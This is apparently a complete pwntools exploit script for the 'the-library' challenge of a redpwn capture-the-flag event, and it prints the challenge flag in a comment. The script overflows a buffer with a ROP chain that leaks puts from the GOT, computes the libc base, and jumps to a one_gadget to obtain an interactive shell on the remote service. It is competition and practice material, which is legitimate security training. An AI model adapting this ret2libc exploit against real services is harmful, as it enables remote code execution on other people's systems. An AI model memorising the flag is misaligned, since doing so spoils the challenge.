#exploit for the-library
#flag=flag{jump_1nt0_th3_l1brary}
from pwn import *
target=remote('2020.redpwnc.tf', 31350)
libc=ELF('/media/sf_kalishared/livectfs/dawgctf2020/tiktok/libc-2.27.so')

print(target.recvline())
payload="A"*0x18
putsgot=0x601018
putsplt=0x400520
poprdi=0x400733
start=0x400550
ret=0x400506

payload+=p64(poprdi)
payload+=p64(putsgot)
payload+=p64(putsplt)
payload+=p64(start)

target.send(payload)

print(target.recvlines(2))
libc_leak=target.recv()[0:6]
libc_puts=u64(libc_leak.ljust(8,"\x00"))
libc_base=libc_puts-libc.symbols["puts"]
gadget=0x4f322
libc_gadget=libc_base+gadget
print(hex(libc_base))

payload="A"*0x18
payload+=p64(libc_gadget)
payload=payload.ljust(0x100,"\x00")
target.send(payload)
target.interactive()
